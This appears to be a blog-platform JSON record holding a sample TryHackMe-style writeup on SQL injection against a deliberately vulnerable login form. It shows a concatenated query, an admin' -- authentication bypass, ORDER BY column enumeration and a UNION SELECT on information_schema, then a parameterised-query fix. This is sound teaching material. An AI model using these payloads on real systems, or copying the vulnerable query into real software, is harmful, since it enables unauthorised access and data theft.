{"slug":"thm-sample-sql-injection-room","title":"Sample THM Writeup: A Login Form and Union-Based SQL Injection","date":"2026-10-05","updated":null,"description":"A template for a TryHackMe room writeup, walking through authentication bypass and UNION-based SQL injection against a deliberately vulnerable login.","category":"writeup","platform":"THM","difficulty":"Easy","tags":["web","sql-injection","sample","thm"],"featured":false,"cover":null,"readingTime":1,"html":"<aside class=\"callout callout-note\" role=\"note\"><p class=\"callout-title\">Note</p>\n<p><strong>Sample content.</strong> This is an illustrative walkthrough of a generic vulnerable login, not a record of a specific room. Replace it with your own notes.</p>\n</aside>\n<h2 id=\"task-overview\">Task overview<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#task-overview\">#</a></h2>\n<p>The target is a login form backed by a SQL database. The goals are to bypass authentication and then extract data from another table.</p>\n<h2 id=\"authentication-bypass\">Authentication bypass<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#authentication-bypass\">#</a></h2>\n<p>The server builds its query by concatenating user input:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">python</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"python\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">query </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> f</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"SELECT * FROM users WHERE username = '</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">{</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">user</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">}</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">' AND password = '</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">{</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">pw</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">}</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">'\"</span></span></code></pre></div>\n<p>Submitting <code>admin' --</code> as the username comments out the password check:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">sql</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"sql\"><code><span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">SELECT</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> *</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> FROM</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> users </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">WHERE</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> username </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> 'admin'</span><span style=\"--shiki-light:#6A737D;--shiki-dark:#768390\"> -- ' AND password = ''</span></span></code></pre></div>\n<h2 id=\"union-based-extraction\">UNION-based extraction<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#union-based-extraction\">#</a></h2>\n<p>First find the number of columns with <code>ORDER BY</code>, increasing until the page errors:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">text</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"text\"><code><span class=\"line\"><span>' ORDER BY 1-- -</span></span>\n<span class=\"line\"><span>' ORDER BY 2-- -</span></span>\n<span class=\"line\"><span>' ORDER BY 3-- -   &#x3C;- error: 2 columns</span></span></code></pre></div>\n<p>Then identify which columns are reflected and read from <code>information_schema</code>:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">sql</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"sql\"><code><span class=\"line\"><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()-- -</span></span></code></pre></div>\n<h2 id=\"the-fix\">The fix<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#the-fix\">#</a></h2>\n<p>Use parameterised queries so input is never parsed as SQL:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">python</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"python\"><code><span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">cursor.execute(</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">    \"SELECT * FROM users WHERE username = </span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">%s</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\"> AND password_hash = </span><span style=\"--shiki-light:#005CC5;--shiki-dark:#F47067\">%s</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">,</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">    (user, hash_password(pw)),</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">)</span></span></code></pre></div>\n<aside class=\"callout callout-important\" role=\"note\"><p class=\"callout-title\">Important</p>\n<p>Escaping quotes by hand is not a fix. Parameterised queries are.</p>\n</aside>","toc":[{"depth":2,"id":"task-overview","text":"Task overview"},{"depth":2,"id":"authentication-bypass","text":"Authentication bypass"},{"depth":2,"id":"union-based-extraction","text":"UNION-based extraction"},{"depth":2,"id":"the-fix","text":"The fix"}],"prev":{"slug":"offsec-lab-methodology-notes","title":"Sample OffSec Notes: A Repeatable Enumeration Methodology"},"next":{"slug":"nmap-scanning-workflow","title":"A Practical Nmap Workflow for Lab Machines"},"related":["htb-sample-lantern","jwt-algorithm-confusion","offsec-lab-methodology-notes"]}